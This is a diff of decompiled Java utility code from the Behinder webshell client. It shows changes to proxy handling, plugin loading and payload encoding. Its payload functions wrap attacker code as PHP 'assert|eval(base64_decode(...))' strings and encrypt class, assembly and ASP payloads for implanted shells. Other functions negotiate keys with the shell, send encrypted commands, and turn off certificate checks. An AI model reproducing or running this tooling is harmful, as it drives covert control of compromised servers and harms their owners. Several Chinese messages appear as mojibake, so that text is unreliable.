@@ -1,17 +1,16 @@
 //
 // Source code recreated from a .class file by IntelliJ IDEA
-// (powered by Fernflower decompiler)
+// (powered by FernFlower decompiler)
 //
 
 package net.rebeyond.behinder.utils;
 
-import java.util.Base64;
+import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import net.rebeyond.behinder.core.Crypt;
 import net.rebeyond.behinder.core.Params;
-import net.rebeyond.behinder.ui.Main;
+import net.rebeyond.behinder.ui.controller.MainController;
 import net.rebeyond.behinder.utils.jc.Run;
-import org.eclipse.swt.widgets.Control;
-import org.eclipse.swt.widgets.MessageBox;
+import org.json.JSONObject;
 
 import javax.net.ssl.*;
 import javax.tools.*;
@@ -21,20 +20,29 @@ import java.awt.datatransfer.Clipboard;
 import java.awt.datatransfer.StringSelection;
 import java.awt.datatransfer.Transferable;
 import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.math.BigInteger;
 import java.net.*;
 import java.nio.charset.StandardCharsets;
 import java.security.KeyManagementException;
+import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.security.SecureRandom;
 import java.security.cert.X509Certificate;
+import java.sql.Timestamp;
+import java.text.SimpleDateFormat;
 import java.util.List;
 import java.util.*;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipFile;
+import java.util.zip.ZipInputStream;
 
 public class Utils {
-    private static Map<String, JavaFileObject> fileObjects = new ConcurrentHashMap<>();
+    private static final Map<String, JavaFileObject> fileObjects = new ConcurrentHashMap();
 
     public Utils() {
     }
@@ -55,7 +63,7 @@ public class Utils {
 
     public static Map<String, String> getKeyAndCookie(String getUrl, String password, Map<String, String> requestHeaders) throws Exception {
         disableSslVerification();
-        Map<String, String> result = new HashMap<>();
+        Map<String, String> result = new HashMap();
         StringBuffer sb = new StringBuffer();
         InputStreamReader isr = null;
         BufferedReader br = null;
@@ -68,37 +76,31 @@ public class Utils {
 
         HttpURLConnection.setFollowRedirects(false);
         Object urlConnection;
-        String urlwithSession;
-        String errorMsg;
+        Proxy proxy;
         if (url.getProtocol().equals("https")) {
-            if (Main.currentProxy != null) {
-                urlConnection = url.openConnection(Main.currentProxy);
-                if (Main.proxyUserName != null && !Main.proxyUserName.equals("")) {
-                    urlwithSession = "Proxy-Authorization";
-                    errorMsg = "Basic " + Base64.getEncoder().encodeToString((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
-                    ((HttpURLConnection) urlConnection).setRequestProperty(urlwithSession, errorMsg);
-                }
+            if (MainController.currentProxy.get("proxy") != null) {
+                proxy = (Proxy) MainController.currentProxy.get("proxy");
+                urlConnection = url.openConnection(proxy);
             } else {
                 urlConnection = url.openConnection();
             }
-        } else if (Main.currentProxy != null) {
-            urlConnection = url.openConnection(Main.currentProxy);
-            if (Main.proxyUserName != null && !Main.proxyUserName.equals("")) {
-                urlwithSession = "Proxy-Authorization";
-                errorMsg = "Basic " + Base64.getEncoder().encodeToString((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
-                ((HttpURLConnection) urlConnection).setRequestProperty(urlwithSession, errorMsg);
-            }
+        } else if (MainController.currentProxy.get("proxy") != null) {
+            proxy = (Proxy) MainController.currentProxy.get("proxy");
+            urlConnection = url.openConnection(proxy);
         } else {
             urlConnection = url.openConnection();
         }
 
-        for (String s : requestHeaders.keySet()) {
-            urlwithSession = s;
-            ((HttpURLConnection) urlConnection).setRequestProperty(urlwithSession, requestHeaders.get(urlwithSession));
+        Iterator var23 = requestHeaders.keySet().iterator();
+
+        String errorMsg;
+        while (var23.hasNext()) {
+            errorMsg = (String) var23.next();
+            ((HttpURLConnection) urlConnection).setRequestProperty(errorMsg, requestHeaders.get(errorMsg));
         }
 
         if (((HttpURLConnection) urlConnection).getResponseCode() == 302 || ((HttpURLConnection) urlConnection).getResponseCode() == 301) {
-            urlwithSession = ((String) ((List) ((HttpURLConnection) urlConnection).getHeaderFields().get("Location")).get(0));
+            String urlwithSession = ((String) ((List) ((HttpURLConnection) urlConnection).getHeaderFields().get("Location")).get(0));
             if (!urlwithSession.startsWith("http")) {
                 urlwithSession = url.getProtocol() + "://" + url.getHost() + ":" + (url.getPort() == -1 ? url.getDefaultPort() : url.getPort()) + urlwithSession;
                 urlwithSession = urlwithSession.replaceAll(password + "=[0-9]*", "");
@@ -112,11 +114,11 @@ public class Utils {
         if (((HttpURLConnection) urlConnection).getResponseCode() == 500) {
             isr = new InputStreamReader(((HttpURLConnection) urlConnection).getErrorStream());
             error = true;
-            errorMsg = "√‹‘øªÒ»° ß∞‹,√‹¬Î¥ÌŒÛ?";
+            errorMsg = "ÂØÜÈí•Ëé∑ÂèñÂ§±Ë¥•,ÂØÜÁ†ÅÈîôËØØ?";
         } else if (((HttpURLConnection) urlConnection).getResponseCode() == 404) {
             isr = new InputStreamReader(((HttpURLConnection) urlConnection).getErrorStream());
             error = true;
-            errorMsg = "“≥√Ê∑µªÿ404¥ÌŒÛ";
+            errorMsg = "È°µÈù¢ËøîÂõû404ÈîôËØØ";
         } else {
             isr = new InputStreamReader(((HttpURLConnection) urlConnection).getInputStream());
         }
@@ -137,7 +139,7 @@ public class Utils {
             Pattern r = Pattern.compile(pattern);
             Matcher m = r.matcher(rawKey_1);
             if (!m.find()) {
-                throw new Exception("“≥√Ê¥Ê‘⁄£¨µ´ «Œﬁ∑®ªÒ»°√‹‘ø!");
+                throw new Exception("È°µÈù¢Â≠òÂú®Ôºå‰ΩÜÊòØÊó†Ê≥ïËé∑ÂèñÂØÜÈí•!");
             } else {
                 int start = 0;
                 int end = 0;
@@ -169,8 +171,8 @@ public class Utils {
 
                     if (end - start == 16) {
                         result.put("cookie", KeyAndCookie.get("cookie"));
-                        result.put("beginIndex", String.valueOf(start));
-                        result.put("endIndex", String.valueOf(temp.length - end));
+                        result.put("beginIndex", start + "");
+                        result.put("endIndex", temp.length - end + "");
                         String finalKey = new String(Arrays.copyOfRange(rawKey_2.getBytes(), start, end));
                         result.put("key", finalKey);
                         return result;
@@ -186,8 +188,12 @@ public class Utils {
         }
     }
 
+    public static String getKey(String password) throws Exception {
+        return getMD5(password);
+    }
+
     public static Map<String, String> getRawKey(String getUrl, String password, Map<String, String> requestHeaders) throws Exception {
-        Map<String, String> result = new HashMap<>();
+        Map<String, String> result = new HashMap();
         StringBuffer sb = new StringBuffer();
         InputStreamReader isr = null;
         BufferedReader br = null;
@@ -200,45 +206,31 @@ public class Utils {
 
         HttpURLConnection.setFollowRedirects(false);
         Object urlConnection;
-        String cookieValues;
-        String headerValue;
         if (url.getProtocol().equals("https")) {
-            if (Main.currentProxy != null) {
-                urlConnection = url.openConnection(Main.currentProxy);
-                if (Main.proxyUserName != null && !Main.proxyUserName.equals("")) {
-                    cookieValues = "Proxy-Authorization";
-                    headerValue = "Basic " + Base64.getEncoder().encodeToString((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
-                    ((HttpURLConnection) urlConnection).setRequestProperty(cookieValues, headerValue);
-                }
-            } else {
-                urlConnection = url.openConnection();
-            }
-        } else if (Main.currentProxy != null) {
-            urlConnection = url.openConnection(Main.currentProxy);
-            if (Main.proxyUserName != null && !Main.proxyUserName.equals("")) {
-                cookieValues = "Proxy-Authorization";
-                headerValue = "Basic " + Base64.getEncoder().encodeToString((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
-                ((HttpURLConnection) urlConnection).setRequestProperty(cookieValues, headerValue);
-            }
+            urlConnection = url.openConnection();
         } else {
             urlConnection = url.openConnection();
         }
 
-        for (String s : requestHeaders.keySet()) {
-            cookieValues = s;
-            ((HttpURLConnection) urlConnection).setRequestProperty(cookieValues, requestHeaders.get(cookieValues));
+        Iterator var9 = requestHeaders.keySet().iterator();
+
+        while (var9.hasNext()) {
+            String headerName = (String) var9.next();
+            ((HttpURLConnection) urlConnection).setRequestProperty(headerName, requestHeaders.get(headerName));
         }
 
-        cookieValues = "";
+        String cookieValues = "";
         Map<String, List<String>> headers = ((HttpURLConnection) urlConnection).getHeaderFields();
-        Iterator<String> var12 = headers.keySet().iterator();
+        Iterator var11 = headers.keySet().iterator();
 
-        String line;
-        while (var12.hasNext()) {
-            String headerName = var12.next();
-            if (headerName != null && headerName.equalsIgnoreCase("Set-Cookie")) {
-                for (Iterator var14 = ((List) headers.get(headerName)).iterator(); var14.hasNext(); cookieValues = cookieValues + ";" + line) {
-                    line = (String) var14.next();
+        String errorMsg;
+        while (var11.hasNext()) {
+            errorMsg = (String) var11.next();
+            if (errorMsg != null && errorMsg.equalsIgnoreCase("Set-Cookie")) {
+                String cookieValue;
+                for (Iterator var13 = ((List) headers.get(errorMsg)).iterator(); var13.hasNext(); cookieValues = cookieValues + ";" + cookieValue) {
+                    cookieValue = (String) var13.next();
+                    cookieValue = cookieValue.replaceAll(";[\\s]*path=[\\s\\S]*;?", "");
                 }
 
                 cookieValues = cookieValues.startsWith(";") ? cookieValues.replaceFirst(";", "") : cookieValues;
@@ -248,21 +240,22 @@ public class Utils {
 
         result.put("cookie", cookieValues);
         boolean error = false;
-        String errorMsg = "";
+        errorMsg = "";
         if (((HttpURLConnection) urlConnection).getResponseCode() == 500) {
             isr = new InputStreamReader(((HttpURLConnection) urlConnection).getErrorStream());
             error = true;
-            errorMsg = "√‹‘øªÒ»° ß∞‹,√‹¬Î¥ÌŒÛ?";
+            errorMsg = "ÂØÜÈí•Ëé∑ÂèñÂ§±Ë¥•,ÂØÜÁ†ÅÈîôËØØ?";
         } else if (((HttpURLConnection) urlConnection).getResponseCode() == 404) {
             isr = new InputStreamReader(((HttpURLConnection) urlConnection).getErrorStream());
             error = true;
-            errorMsg = "“≥√Ê∑µªÿ404¥ÌŒÛ";
+            errorMsg = "È°µÈù¢ËøîÂõû404ÈîôËØØ";
         } else {
             isr = new InputStreamReader(((HttpURLConnection) urlConnection).getInputStream());
         }
 
         br = new BufferedReader(isr);
 
+        String line;
         while ((line = br.readLine()) != null) {
             sb.append(line);
         }
@@ -313,18 +306,13 @@ public class Utils {
     }
 
     public static Map<String, Object> sendPostRequestBinary(String urlPath, Map<String, String> header, byte[] data) throws Exception {
-        Map<String, Object> result = new HashMap<>();
+        Map<String, Object> result = new HashMap();
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
         URL url = new URL(urlPath);
         HttpURLConnection conn;
-        String key;
-        if (Main.currentProxy != null) {
-            conn = (HttpURLConnection) url.openConnection(Main.currentProxy);
-            if (Main.proxyUserName != null && !Main.proxyUserName.equals("")) {
-                key = "Proxy-Authorization";
-                String headerValue = "Basic " + Base64.getEncoder().encodeToString((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
-                conn.setRequestProperty(key, headerValue);
-            }
+        if (MainController.currentProxy.get("proxy") != null) {
+            Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
+            conn = (HttpURLConnection) url.openConnection(proxy);
         } else {
             conn = (HttpURLConnection) url.openConnection();
         }
@@ -332,9 +320,10 @@ public class Utils {
         conn.setRequestProperty("Content-Type", "application/octet-stream");
         conn.setRequestMethod("POST");
         if (header != null) {
+            Iterator var12 = header.keySet().iterator();
 
-            for (String s : header.keySet()) {
-                key = s;
+            while (var12.hasNext()) {
+                String key = (String) var12.next();
                 conn.setRequestProperty(key, header.get(key));
             }
         }
@@ -360,15 +349,16 @@ public class Utils {
             }
 
             byte[] resData = bos.toByteArray();
-            System.out.println("res before decrypt:" + new String(resData));
             result.put("data", resData);
-            Map<String, String> responseHeader = new HashMap<>();
+            Map<String, String> responseHeader = new HashMap();
+            Iterator var18 = conn.getHeaderFields().keySet().iterator();
 
-            for (String headerKey : conn.getHeaderFields().keySet()) {
-                responseHeader.put(headerKey, conn.getHeaderField(headerKey));
+            while (var18.hasNext()) {
+                String key = (String) var18.next();
+                responseHeader.put(key, conn.getHeaderField(key));
             }
 
-            responseHeader.put("status", String.valueOf(conn.getResponseCode()));
+            responseHeader.put("status", conn.getResponseCode() + "");
             result.put("header", responseHeader);
             return result;
         } else {
@@ -417,7 +407,7 @@ public class Utils {
             for (reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), StandardCharsets.UTF_8)); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
             }
 
-            throw new Exception("«Î«Û∑µªÿ“Ï≥£" + sb.toString());
+            throw new Exception("ËØ∑Ê±ÇËøîÂõûÂºÇÂ∏∏" + sb.toString());
         }
     }
 
@@ -450,7 +440,7 @@ public class Utils {
             for (reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), StandardCharsets.UTF_8)); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
             }
 
-            throw new Exception("«Î«Û∑µªÿ“Ï≥£" + sb.toString());
+            throw new Exception("ËØ∑Ê±ÇËøîÂõûÂºÇÂ∏∏" + sb.toString());
         }
     }
 
@@ -459,12 +449,12 @@ public class Utils {
         byte[] encrypedBincls;
         if (type.equals("jsp")) {
             encrypedBincls = Crypt.Encrypt(payload, key);
-            String basedEncryBincls = Base64.getEncoder().encodeToString(encrypedBincls);
+            String basedEncryBincls = Base64.encode(encrypedBincls);
             result = basedEncryBincls.getBytes();
         } else if (type.equals("php")) {
-            encrypedBincls = ("assert|eval(base64_decode('" + Base64.getEncoder().encodeToString(payload) + "'));").getBytes();
+            encrypedBincls = ("assert|eval(base64_decode('" + Base64.encode(payload) + "'));").getBytes();
             encrypedBincls = Crypt.EncryptForPhp(encrypedBincls, key, encryptType);
-            result = Base64.getEncoder().encodeToString(encrypedBincls).getBytes();
+            result = Base64.encode(encrypedBincls).getBytes();
         } else if (type.equals("aspx")) {
             Map<String, String> params = new LinkedHashMap<>();
             params.put("code", new String(payload));
@@ -477,8 +467,46 @@ public class Utils {
         return result;
     }
 
+    public static byte[] getPluginData(String key, int encryptType, String payloadPath, Map<String, String> params, String type) throws Exception {
+        byte[] bincls;
+        if (type.equals("jsp")) {
+            bincls = Params.getParamedClassForPlugin(payloadPath, params);
+            return bincls;
+        } else {
+            byte[] encrypedBincls;
+            if (type.equals("php")) {
+                bincls = Params.getParamedPhp(payloadPath, params);
+                bincls = Base64.encode(bincls).getBytes();
+                bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
+                encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
+                return Base64.encode(encrypedBincls).getBytes();
+            } else if (type.equals("aspx")) {
+                bincls = Params.getParamedAssembly(payloadPath, params);
+                encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
+                return encrypedBincls;
+            } else if (type.equals("asp")) {
+                bincls = Params.getParamedAsp(payloadPath, params);
+                encrypedBincls = Crypt.EncryptForAsp(bincls, key);
+                return encrypedBincls;
+            } else {
+                return null;
+            }
+        }
+    }
+
     public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type) throws Exception {
         return getData(key, encryptType, className, params, type, null);
+    }
+
+    public static String map2Str(Map<String, String> paramsMap) {
+        String result = "";
+
+        String key;
+        for (Iterator var2 = paramsMap.keySet().iterator(); var2.hasNext(); result = result + key + "^" + paramsMap.get(key) + "\n") {
+            key = (String) var2.next();
+        }
+
+        return result;
     }
 
     public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type, byte[] extraData) throws Exception {
@@ -492,18 +520,18 @@ public class Utils {
             }
 
             encrypedBincls = Crypt.Encrypt(bincls, key);
-            String basedEncryBincls = Base64.getEncoder().encodeToString(encrypedBincls);
+            String basedEncryBincls = Base64.encode(encrypedBincls);
             return basedEncryBincls.getBytes();
         } else if (type.equals("php")) {
             bincls = Params.getParamedPhp(className, params);
-            bincls = Base64.getEncoder().encodeToString(bincls).getBytes();
+            bincls = Base64.encode(bincls).getBytes();
             bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
             if (extraData != null) {
                 bincls = CipherUtils.mergeByteArray(bincls, extraData);
             }
 
             encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
-            return Base64.getEncoder().encodeToString(encrypedBincls).getBytes();
+            return Base64.encode(encrypedBincls).getBytes();
         } else if (type.equals("aspx")) {
             bincls = Params.getParamedAssembly(className, params);
             if (extraData != null) {
@@ -539,7 +567,7 @@ public class Utils {
     }
 
     public static List<byte[]> splitBytes(byte[] content, int size) throws Exception {
-        List<byte[]> result = new ArrayList<>();
+        List<byte[]> result = new ArrayList();
         byte[] buffer = new byte[size];
         ByteArrayInputStream bis = new ByteArrayInputStream(content);
         boolean var5 = false;
@@ -578,11 +606,11 @@ public class Utils {
     public static byte[] ascii2unicode(String str, int type) throws Exception {
         ByteArrayOutputStream buf = new ByteArrayOutputStream();
         DataOutputStream out = new DataOutputStream(buf);
-        byte[] var7;
-        int var6 = (var7 = str.getBytes()).length;
+        byte[] var4 = str.getBytes();
+        int var5 = var4.length;
 
-        for (int var5 = 0; var5 < var6; ++var5) {
-            byte b = var7[var5];
+        for (int var6 = 0; var6 < var5; ++var6) {
+            byte b = var4[var6];
             out.writeByte(b);
             out.writeByte(0);
         }
@@ -612,6 +640,72 @@ public class Utils {
         return currentPath;
     }
 
+    public static JSONObject parsePluginZip(String zipFilePath) throws Exception {
+        String pluginRootPath = getSelfPath() + "/Plugins";
+        String pluginName = "";
+        ZipFile zf = new ZipFile(zipFilePath);
+        InputStream in = new BufferedInputStream(new FileInputStream(zipFilePath));
+        ZipInputStream zin = new ZipInputStream(in);
+
+        ZipEntry ze;
+        while ((ze = zin.getNextEntry()) != null) {
+            if (ze.getName().equals("plugin.config")) {
+                BufferedReader br = new BufferedReader(new InputStreamReader(zf.getInputStream(ze)));
+                Properties pluginConfig = new Properties();
+                pluginConfig.load(br);
+                pluginName = pluginConfig.getProperty("name");
+                br.close();
+            }
+        }
+
+        zin.closeEntry();
+        String pluginPath = pluginRootPath + "/" + pluginName;
+        ZipUtil.unZipFiles(zipFilePath, pluginPath);
+        FileInputStream fis = new FileInputStream(pluginPath + "/plugin.config");
+        Properties pluginConfig = new Properties();
+        pluginConfig.load(fis);
+        JSONObject pluginEntity = new JSONObject();
+        pluginEntity.put("name", pluginName);
+        pluginEntity.put("version", pluginConfig.getProperty("version", "v1.0"));
+        pluginEntity.put("entryFile", pluginConfig.getProperty("entry", "index.htm"));
+        pluginEntity.put("icon", pluginConfig.getProperty("icon", "/Users/rebeyond/host.png"));
+        pluginEntity.put("scriptType", pluginConfig.getProperty("scriptType"));
+        pluginEntity.put("isGetShell", pluginConfig.getProperty("isGetShell"));
+        pluginEntity.put("type", pluginConfig.getProperty("type"));
+        pluginEntity.put("author", pluginConfig.getProperty("author"));
+        pluginEntity.put("link", pluginConfig.getProperty("link"));
+        pluginEntity.put("qrcode", pluginConfig.getProperty("qrcode"));
+        pluginEntity.put("comment", pluginConfig.getProperty("comment"));
+        return pluginEntity;
+    }
+
+    public static <T> T json2Obj(JSONObject json, Class<T> target) throws Exception {
+        T obj = target.newInstance();
+        Field[] var3 = target.getDeclaredFields();
+        int var4 = var3.length;
+
+        for (int var5 = 0; var5 < var4; ++var5) {
+            Field f = var3[var5];
+
+            try {
+                String filedName = f.getName();
+                String setName = "set" + filedName.substring(0, 1).toUpperCase() + filedName.substring(1);
+                Method m = target.getMethod(setName, String.class);
+                m.invoke(obj, json.get(filedName).toString());
+            } catch (Exception var10) {
+            }
+        }
+
+        return obj;
+    }
+
+    public static String getMD5(String clearText) throws NoSuchAlgorithmException {
+        MessageDigest m = MessageDigest.getInstance("MD5");
+        m.update(clearText.getBytes(), 0, clearText.length());
+        String hash = (new BigInteger(1, m.digest())).toString(16).substring(0, 16);
+        return hash;
+    }
+
     public static void main(String[] args) {
         String sourceCode = "package net.rebeyond.behinder.utils;public class Hello{    public String sayHello (String name) {return \"Hello,\" + name + \"!\";}}";
 
@@ -638,13 +732,13 @@ public class Utils {
             }};
             SSLContext sc = SSLContext.getInstance("SSL");
             sc.init(null, trustAllCerts, new SecureRandom());
-            List<String> cipherSuites = new ArrayList<>();
-            String[] var6;
-            int var5 = (var6 = sc.getSupportedSSLParameters().getCipherSuites()).length;
+            List<String> cipherSuites = new ArrayList();
+            String[] var3 = sc.getSupportedSSLParameters().getCipherSuites();
+            int var4 = var3.length;
 
-            for (int var4 = 0; var4 < var5; ++var4) {
-                String cipher = var6[var4];
-                if (!cipher.contains("_DHE_") && !cipher.contains("_DH_")) {
+            for (int var5 = 0; var5 < var4; ++var5) {
+                String cipher = var3[var5];
+                if (cipher.indexOf("_DHE_") < 0 && cipher.indexOf("_DH_") < 0) {
                     cipherSuites.add(cipher);
                 }
             }
@@ -664,11 +758,29 @@ public class Utils {
 
     }
 
-    public static void showError(Control control, String errorTxt) {
-        MessageBox dialog = new MessageBox(control.getShell(), 33);
-        dialog.setText("±£¥Ê ß∞‹");
-        dialog.setMessage(errorTxt);
-        dialog.open();
+    public static Map<String, String> jsonToMap(JSONObject obj) {
+        Map<String, String> result = new HashMap();
+        Iterator var2 = obj.keySet().iterator();
+
+        while (var2.hasNext()) {
+            String key = (String) var2.next();
+            result.put(key, (String) obj.get(key));
+        }
+
+        return result;
+    }
+
+    public static Timestamp stringToTimestamp(String timeString) {
+        Timestamp timestamp = null;
+
+        try {
+            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss.SSS");
+            Date parsedDate = dateFormat.parse(timeString);
+            timestamp = new Timestamp(parsedDate.getTime());
+        } catch (Exception var4) {
+        }
+
+        return timestamp;
     }
 
     public static class MyJavaFileManager extends ForwardingJavaFileManager<JavaFileManager> {
@@ -689,38 +801,6 @@ public class Utils {
             JavaFileObject javaFileObject = new Utils.MyJavaFileObject(qualifiedClassName, kind);
             Utils.fileObjects.put(qualifiedClassName, javaFileObject);
             return javaFileObject;
-        }
-    }
-
-    public static class MyJavaFileObject extends SimpleJavaFileObject {
-        private String source;
-        private ByteArrayOutputStream outPutStream;
-
-        public MyJavaFileObject(String name, String source) {
-            super(URI.create("String:///" + name + Kind.SOURCE.extension), Kind.SOURCE);
-            this.source = source;
-        }
-
-        public MyJavaFileObject(String name, Kind kind) {
-            super(URI.create("String:///" + name + kind.extension), kind);
-            this.source = null;
-        }
-
-        public CharSequence getCharContent(boolean ignoreEncodingErrors) {
-            if (this.source == null) {
-                throw new IllegalArgumentException("source == null");
-            } else {
-                return this.source;
-            }
-        }
-
-        public OutputStream openOutputStream() throws IOException {
-            this.outPutStream = new ByteArrayOutputStream();
-            return this.outPutStream;
-        }
-
-        public byte[] getCompiledBytes() {
-            return this.outPutStream.toByteArray();
         }
     }
 
@@ -769,6 +849,38 @@ public class Utils {
 
         public Socket createSocket(InetAddress address, int port, InetAddress localaddress, int localport) throws IOException {
             return this.getSocketWithEnabledCiphers(this.sf.createSocket(address, port, localaddress, localport));
+        }
+    }
+
+    public static class MyJavaFileObject extends SimpleJavaFileObject {
+        private final String source;
+        private ByteArrayOutputStream outPutStream;
+
+        public MyJavaFileObject(String name, String source) {
+            super(URI.create("String:///" + name + Kind.SOURCE.extension), Kind.SOURCE);
+            this.source = source;
+        }
+
+        public MyJavaFileObject(String name, Kind kind) {
+            super(URI.create("String:///" + name + kind.extension), kind);
+            this.source = null;
+        }
+
+        public CharSequence getCharContent(boolean ignoreEncodingErrors) {
+            if (this.source == null) {
+                throw new IllegalArgumentException("source == null");
+            } else {
+                return this.source;
+            }
+        }
+
+        public OutputStream openOutputStream() throws IOException {
+            this.outPutStream = new ByteArrayOutputStream();
+            return this.outPutStream;
+        }
+
+        public byte[] getCompiledBytes() {
+            return this.outPutStream.toByteArray();
         }
     }
 }
